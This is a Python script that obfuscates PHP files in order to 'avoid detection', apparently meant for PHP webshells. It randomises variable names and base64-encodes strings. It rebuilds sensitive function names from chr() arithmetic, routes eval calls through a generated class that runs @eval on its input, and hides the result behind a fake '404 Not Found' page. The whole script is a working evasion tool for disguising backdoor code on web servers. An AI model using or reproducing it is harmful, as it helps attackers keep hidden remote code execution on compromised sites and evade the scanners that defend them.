import argparse
import base64
import re
import time
import html
import random

def generate_random_html(num_tags):
    tags = ['div', 'p', 'span', 'h1', 'h2', 'h3']
    return ''.join(f'<{random.choice(tags)}>{html.escape("".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(10, 20))))}</{random.choice(tags)}>' for _ in range(num_tags))

def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.read()

def random_variable_name():
    return '$' + ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=random.randint(5, 10)))

def random_string(data):
    return f"base64_decode('{base64.b64encode(data.encode('utf-8')).decode('utf-8')}')"

def replace_php_variables(content):
    pattern = re.compile(r'(\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)(?=\s*=)')
    variables = sorted(set(pattern.findall(content)), key=len, reverse=True)
    for var in variables:
        content = content.replace(var, random_variable_name())
    return content

def replace_php_strings(content):
    pattern = re.compile(r"(?<!\\)['\"](.*?)(?<!\\)['\"]")
    strings = sorted(set(filter(None, pattern.findall(content))), key=len, reverse=True)
    for string in strings:
        content = content.replace(f"'{string}'", random_string(string))
    return content

def change_func(content):
    def deformation(func):
            # 生成随机函数名
            random_func = random_variable_name()[1:]
            template=f'function {random_func}()'
            template+="{"
            # 将函数名分割为单个字符
            func=list(func)
            # 将每个字符转化为chr()函数
            ret=0
            for i in func:
                orddata=ord(i)
                # 随机10-20中的一个数
                num=random.randint(5,16)
                orddata=orddata*num
                if ret==0:
                    template+="return chr("+str(orddata)+"/"+str(num)+")"
                    ret=1
                else:
                    if random.randint(1,4)%4==0:
                        template+=AddComment(7,15)
                    template+=".chr("+str(orddata)+"/"+str(num)+")"
            template+=";\n}"
            return {random_func:template}

    functions = ['base64_decode', 'base64_encode', 'openssl_pkey_get_public', 'explode', 'openssl_public_decrypt', 'call_user_func', 'file_get_contents']
    dicts = {i: deformation(i) for i in functions if i in content}
    for func, replacements in dicts.items():
        for key, value in replacements.items():
            random_func = random_variable_name()
            content = f"<?php\n{value}\n{random_func} = {key}();\n?>\n" + content.replace(func, random_func)
    return content

def AddComment(l, r):
    return f"/* {' '.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=random.randint(l, r)))} */"

def eval_func(content):
    classname = random_variable_name()[1:]
    content = content.replace("eval(", f"${classname}=new {classname}(")
    pattern_all = re.compile(r'eval\(.*?\)?;')
    data = create_class(classname)
    return data + content

def create_class(random_class):
    return f'''<?php class {random_class}{{
    public $data;
    public function __construct($data){{
        @eval($data);
        $this->data="Who am I";
    }}
    public function __destruct(){{
        date('Y-m-d H:i:s');
    }}
    function get_image_path($goods_id, $image='', $thumb=false, $type='goods', $server=''){{
        if (empty($image)) return $GLOBALS['http'] . '/themes/default/images/none.gif';
        $path = $GLOBALS['http'] . '/data/' . $type . '/';
        if ($thumb) $path .= 'thumb/';
        return $path . $image;
    }}
}}'''

def confuse(content):
    content = replace_php_variables(content)
    content = replace_php_strings(content)
    content = eval_func(content)
    content = change_func(content)
    tmpname = f"{str(time.time()).split('.')[0]}.php"
    content = content.replace("<?php", "").replace("?>", "")
    content = f"<?php //echo '{generate_random_html(30)}' \n{content}?>"
    content = f'''<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
</body></html>\n{content}'''
    with open(tmpname, "w") as f:
        f.write(content)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Confuse PHP code to avoid detection.')
    parser.add_argument('-f', '--file', required=True, help='The file you want to confuse')
    args = parser.parse_args()
    content = read_file(args.file)
    confuse(content)
